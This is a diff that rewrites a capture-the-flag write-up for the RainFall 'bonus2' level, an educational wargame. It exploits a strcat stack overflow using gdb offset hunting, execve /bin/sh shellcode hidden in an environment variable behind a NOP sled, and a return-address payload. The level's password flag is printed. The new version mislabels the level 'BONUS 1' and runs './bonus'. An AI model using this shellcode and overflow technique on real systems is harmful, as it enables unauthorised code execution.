@@ -1,109 +1,105 @@
-## BONUS 2
-
-Ressources:
-- [Disassembled code](disassembled_code.md)
-- [Source code](srcs/bonus2.c)
-
-In this program, we have two functions `main()` and `greetuser()`. `main()` concatenates use `strncpy()` on `av[1]` and `av[2]` to concatenates those two strings in a buffer of 72 bytes, then it will search the environment variable `LANG` if it has been found and `LANG` start with `fi` the language value is 1, if LANG start with `nl` the language value is 2 and if LANG has not been found the language value is 0. Depending of the language value, `greetuser()` will concatenates a different message in a buffer with the previous string.
-
-For exemple if a set `fi` as `LANG` value, the program will print:
-
-``` shell
-bonus2@RainFall:~$ ./bonus2 "Hey" "HowAreYou"
-Hyvää päivää Hey
-```
-
-The program did not concatenates the two strings because it use `strncpy(..., 40)` that's means that if our string is not longer than 40 characters, it end up with a NULL character. So to create a string of size 72 we have to set a string longer than 40 characters.
-
-```shell
-./bonus2 $(python -c 'print ("A"*40)') "HowAreYou"
-Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHowAreYou
-```
-
-Perfect, if we take a look on the function `greetuser()` we can see that the function concatenates a message depending on the `language` value with the previous buffer. So we can try to overflow it.
-
-```shell
-bonus2@RainFall:~$ ./bonus2 $(python -c 'print ("A"*40)') $(python  -c 'print ("B"*32)')
-Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
-Segmentation fault (core dumped)
-```
-
-Excellent, we just have to use a **Buffer Overflow Attack**. But as many times before we need some informations before creating the payload.
-
-**For all the information I will find, I will use an environment variable starting with `fi`.**
-
+## BONUS 1
+---
+### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
 ---
 
-#### EIP
+We're becoming familiar the automatisms to solve these levels. As usual, we start by looking the code. The code is too long to be displayed here, so I will just show the part that is interesting for us. If you want to see that whole code, you can find it [here](./src/bonus2.c).
 
-```shell
-bonus2@RainFall:~$ gdb -q bonus2
-Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
-(gdb) r $(python -c 'print ("A"*40)') "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
-Starting program: /home/user/bonus2/bonus2 $(python -c 'print ("A"*40)') "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
-Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Now that we understand what this code does. We can start our research to exploit this code.
 
-Program received signal SIGSEGV, Segmentation fault.
-0x41366141 in ?? ()
-```
+First we need to find the vulnerabity inside the code. The first thing that I noticed is the `strncpy` and `strcat` calls. Let's take a look to find a potential vulnerability.
 
-The EIP offset is size of **18**.
-
----
-
-#### Shellcode
-
-I will use the same Shellcode as in the previous levels.
-
-`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
-
-But to this level we will use a different technique because we will inject the Shellcode in a environment variable.
-
-`export LANG=$(python -c 'print("fi" + "\x90" * 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')`
-
----
-
-#### ShellCode address
-
-Now we need to know where this address is store.
-
-```shell
-(gdb) x/32s *((char **)environ)
-0xbffff85b:	 "SHELL=/bin/bash"
-0xbffff86b:	 "TERM=xterm-256color"
-0xbffff87f:	 "SSH_CLIENT=192.168.56.1 63733 4242"
+```c
+int
+main (int argc, char **argv) {
+	char	buffer[72];
 [...]
-0xbffffe60:	 "PWD=/home/user/bonus2"
-0xbffffe76:	 "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
-0xbffffef7:	 "LINES=52"
+	strncpy(buffer, argv[1], 40);
+	strncpy(&buffer[40], argv[2], 32);
 [...]
-0xbffffffe:	 ""
+	greetuser(buffer);
+}
+
+void
+greetuser (char *user) {
+	char	buffer[64];
+[...]
+	strcat(buffer, user);
+[...]
+}
 ```
 
-Now we know that our variable is at the address `0xbffffe76` but i gonna add 16 bits to be sure. 
+That's interesting! We have two buffers, and it appears that the `greetuser` function copies a buffer larger than its size. This indicates a potential buffer overflow vulnerability. By examining the code, I can see that the buffer inside the `greetuser` function can be filled up to 85 bytes (72 + 13). Therefore, I can overflow the return value of the `greetuser` function.
 
-`0xbffffe76 + 0x10 = 0xbffffe86`
+Now that we have identified the vulnerability and the target for the buffer overflow, the next step is to consider how to obtain the flag. Since the code does not contain any `system` calls, we will need to use a ShellCode. In this case, we can utilize the same ShellCode that we used in previous levels.
 
----
+The only question im asking to myself is where to put this ShellCode ?
 
-### Payload
+We have two options:
+1. Put the ShellCode inside the first argument.
+2. Put the ShellCode inside environment variables.
 
-We can now create our payloads.
+Let's use the second option because we saw in the bonus0 that running code from stack isn't easy !
 
-`python -c 'print("\x90"*40)' > /tmp/payload_1`
+First I need to find the distance between the buffer in `greetuser` and it's return address. To do that, I will use the `gdb`.
 
-`python -c 'print("\x90"*18 + "\x86\xfe\xff\xbf")' > /tmp/payload_2`'`
+```bash
+(gdb) x/a $ebp+4
+0xbffff62c:	0x8048630 <main+263>
+(gdb) x/32s $esp
+[...]
+0xbffff5e0:	 "Hello "
+[...]
+```
 
-Perfect, we just have to inject the payloads into the program.
+So the distance is 0x4c (76 in decimal). You need to remove 6 because of the "Hello " string.
+In my case, I will remove 13 because I will set LANG to `fi` and the buffer will be filled with "Hyvää päivää ".
+So the distance is 76 - 13 = 63.
+
+Before to fo further I need to be sure of these numbers.
 
 ```shell
-bonus2@RainFall:~$ ./bonus2 $(cat /tmp/payload_17) $(cat /tmp/payload_27)
+(gdb) r `python -c 'print "A"*40'` `python -c 'print "A"*19 + "1234"'`
+Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40'` `python -c 'print "A"*19 + "1234"'`
+(gdb) x/32a $ebp
+0xbffff638:	0x41414141	0x33323141	0x41410034	0x41414141
+```
+
+Oh, it's always good to check, as we can see the padding isn't good I have to remove 1 byte from the second argument !
+
+```shell
+(gdb) r `python -c 'print "A"*40'` `python -c 'print "A"*18 + "1234"'`
+Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40'` `python -c 'print "A"*18 + "1234"'`
+(gdb) x/32a $ebp
+0xbffff638:	0x41414141	0x34333231	0x41414100	0x41414141
+```
+
+Perfect ! Now we can continue.
+I need to get the address where is store the environment variables.
+
+```shell
+$ export SHELLCODE=$(python -c 'print "\x90"*64 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+
+(gdb) x/s *((char **)environ)
+0xbffff8b2:	 "SHELLCODE=\220\220\220\220[...]
+```
+
+I will add 0x20 to this address to be sure to be inside the NOP operators and skip the variable name.
+    
+```shell
+(gdb) x/s *((char **)environ)+32
+0xbffff8d2:	 "\220\220\220\220\220\220[...]
+```
+
+Now I can start to build my payload.
+
+```shell
+$ python -c 'print "\x90" * 40' > /tmp/payload_part1
+$ python -c 'print "\x90" * 18 + "\xd2\xf8\xff\xbf"' > /tmp/payload_part2
+$ ./bonus `cat /tmp/payload_part1` `cat /tmp/payload_part2`
 Hyvää päivää ��������������������������������������������������������������
+$ whoami
+bonus3
 $ cat /home/user/bonus3/.pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 ```
-
-
-
-
-
